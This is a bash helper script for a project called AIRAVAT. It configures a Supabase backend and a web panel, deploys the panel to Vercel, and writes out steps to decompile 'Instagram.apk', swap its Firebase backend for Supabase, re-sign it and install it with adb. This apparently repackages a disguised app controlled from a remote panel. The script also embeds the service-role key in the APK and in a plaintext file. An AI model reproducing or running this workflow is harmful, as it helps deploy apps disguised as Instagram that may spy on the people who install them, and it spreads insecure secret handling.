#!/bin/bash

# AIRAVAT Supabase Migration & Deployment Script
# This script helps automate the migration and deployment process

echo "🚀 AIRAVAT Supabase Migration & Deployment Helper"
echo "================================================="
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}✓${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}⚠${NC} $1"
}

print_error() {
    echo -e "${RED}✗${NC} $1"
}

print_info() {
    echo -e "${BLUE}ℹ${NC} $1"
}

# Check if required tools are installed
check_requirements() {
    echo "Checking requirements..."
    
    # Check for Node.js
    if ! command -v node &> /dev/null; then
        print_error "Node.js is not installed. Please install Node.js from https://nodejs.org/"
        exit 1
    fi
    print_status "Node.js found"
    
    # Check for npm
    if ! command -v npm &> /dev/null; then
        print_error "npm is not installed. Please install npm."
        exit 1
    fi
    print_status "npm found"
    
    # Check for git
    if ! command -v git &> /dev/null; then
        print_warning "Git is not installed. You may need it for deployment."
    else
        print_status "Git found"
    fi
    
    echo ""
}

# Install Vercel CLI if not present
install_vercel() {
    if ! command -v vercel &> /dev/null; then
        print_info "Installing Vercel CLI..."
        npm install -g vercel
        print_status "Vercel CLI installed"
    else
        print_status "Vercel CLI already installed"
    fi
    echo ""
}

# Function to collect Supabase configuration
collect_supabase_config() {
    echo "📝 Supabase Configuration"
    echo "========================="
    echo ""
    
    print_info "Please provide your Supabase project details:"
    echo ""
    
    read -p "Supabase Project URL (e.g., https://abcdef.supabase.co): " SUPABASE_URL
    read -p "Supabase Anon Key: " SUPABASE_ANON_KEY
    read -p "Supabase Service Role Key: " SUPABASE_SERVICE_KEY
    
    # Validate inputs
    if [[ -z "$SUPABASE_URL" || -z "$SUPABASE_ANON_KEY" ]]; then
        print_error "URL and Anon Key are required!"
        exit 1
    fi
    
    print_status "Configuration collected"
    echo ""
}

# Update web panel configuration
update_web_panel() {
    echo "🔧 Updating Web Panel Configuration"
    echo "===================================="
    echo ""
    
    # Create backup
    cp "WEB PANEL/index.html" "WEB PANEL/index.html.backup"
    print_status "Created backup of index.html"
    
    # Update configuration in index.html
    sed -i.bak "s|url: \"SUPABASE_URL\"|url: \"$SUPABASE_URL\"|g" "WEB PANEL/index.html"
    sed -i.bak "s|key: \"SUPABASE_ANON_KEY\"|key: \"$SUPABASE_ANON_KEY\"|g" "WEB PANEL/index.html"
    
    # Remove backup file
    rm "WEB PANEL/index.html.bak"
    
    print_status "Web panel configuration updated"
    echo ""
}

# Create Android configuration file
create_android_config() {
    echo "📱 Creating Android Configuration"
    echo "================================="
    echo ""
    
    # Update the Android configuration file
    sed -i.bak "s|https://your-project-id.supabase.co|$SUPABASE_URL|g" "ANDROID APP/supabase_strings.xml"
    sed -i.bak "s|your-supabase-anon-key|$SUPABASE_ANON_KEY|g" "ANDROID APP/supabase_strings.xml"
    sed -i.bak "s|your-supabase-service-role-key|$SUPABASE_SERVICE_KEY|g" "ANDROID APP/supabase_strings.xml"
    
    # Remove backup file
    rm "ANDROID APP/supabase_strings.xml.bak"
    
    print_status "Android configuration updated"
    echo ""
}

# Deploy to Vercel
deploy_to_vercel() {
    echo "🚀 Deploying to Vercel"
    echo "======================"
    echo ""
    
    print_info "This will deploy your web panel to Vercel..."
    read -p "Do you want to continue? (y/N): " CONFIRM
    
    if [[ $CONFIRM =~ ^[Yy]$ ]]; then
        print_info "Starting Vercel deployment..."
        
        # Login to Vercel (if not already logged in)
        vercel login
        
        # Deploy
        vercel --prod
        
        print_status "Deployment initiated"
        print_info "Your web panel should be available at the Vercel URL shown above"
    else
        print_info "Skipping Vercel deployment"
        print_info "You can deploy manually later using: vercel --prod"
    fi
    echo ""
}

# Generate APK modification instructions
generate_apk_instructions() {
    echo "📋 APK Modification Instructions"
    echo "================================"
    echo ""
    
    cat << EOF > "APK_MODIFICATION_STEPS.txt"
APK Modification Steps for AIRAVAT Supabase Migration
=====================================================

Your Supabase Configuration:
- URL: $SUPABASE_URL
- Anon Key: $SUPABASE_ANON_KEY
- Service Role Key: $SUPABASE_SERVICE_KEY

Steps to modify the APK:

1. Decompile the Instagram.apk:
   apktool d "ANDROID APP/Instagram.apk"

2. Replace res/values/strings.xml with the content from:
   "ANDROID APP/supabase_strings.xml"

3. Add the SupabaseClient.java file to your project:
   Copy "ANDROID APP/SupabaseClient.java" to your source directory

4. Replace Firebase code with Supabase calls:
   - Remove Firebase dependencies from build.gradle
   - Replace FirebaseDatabase calls with SupabaseClient calls
   - Update authentication and storage code

5. Recompile the APK:
   apktool b Instagram -o Instagram_supabase.apk

6. Sign the APK:
   keytool -genkey -v -keystore airavat.keystore -alias airavat -keyalg RSA -keysize 2048 -validity 10000
   jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore airavat.keystore Instagram_supabase.apk airavat
   zipalign -v 4 Instagram_supabase.apk Instagram_final.apk

7. Install and test:
   adb install Instagram_final.apk

For detailed instructions, see MIGRATION_GUIDE.md
EOF

    print_status "APK modification instructions saved to APK_MODIFICATION_STEPS.txt"
    echo ""
}

# Create database setup script
create_db_script() {
    echo "🗄️ Database Setup"
    echo "=================="
    echo ""
    
    print_info "To set up your Supabase database:"
    echo "1. Go to your Supabase dashboard"
    echo "2. Navigate to the SQL Editor"
    echo "3. Copy and paste the content from 'supabase-schema.sql'"
    echo "4. Run the SQL script"
    echo ""
    
    print_warning "Important: Make sure to execute the SQL schema before deploying!"
    echo ""
}

# Main menu
show_menu() {
    echo "🎯 What would you like to do?"
    echo "============================"
    echo ""
    echo "1) Complete migration setup (recommended)"
    echo "2) Update web panel configuration only"
    echo "3) Create Android configuration only"
    echo "4) Deploy to Vercel only"
    echo "5) Generate APK modification instructions"
    echo "6) Show database setup instructions"
    echo "7) Exit"
    echo ""
}

# Main execution
main() {
    check_requirements
    
    while true; do
        show_menu
        read -p "Choose an option (1-7): " CHOICE
        echo ""
        
        case $CHOICE in
            1)
                install_vercel
                collect_supabase_config
                update_web_panel
                create_android_config
                create_db_script
                deploy_to_vercel
                generate_apk_instructions
                print_status "Complete migration setup finished!"
                echo ""
                print_info "Next steps:"
                echo "1. Set up your Supabase database using the SQL schema"
                echo "2. Modify and recompile the Android APK"
                echo "3. Test the complete system"
                echo ""
                break
                ;;
            2)
                collect_supabase_config
                update_web_panel
                print_status "Web panel configuration updated!"
                ;;
            3)
                collect_supabase_config
                create_android_config
                print_status "Android configuration created!"
                ;;
            4)
                install_vercel
                deploy_to_vercel
                ;;
            5)
                if [[ -z "$SUPABASE_URL" ]]; then
                    collect_supabase_config
                fi
                generate_apk_instructions
                ;;
            6)
                create_db_script
                ;;
            7)
                print_info "Goodbye! 👋"
                exit 0
                ;;
            *)
                print_error "Invalid option. Please choose 1-7."
                ;;
        esac
        
        echo ""
        read -p "Press Enter to continue..."
        echo ""
    done
}

# Run main function
main
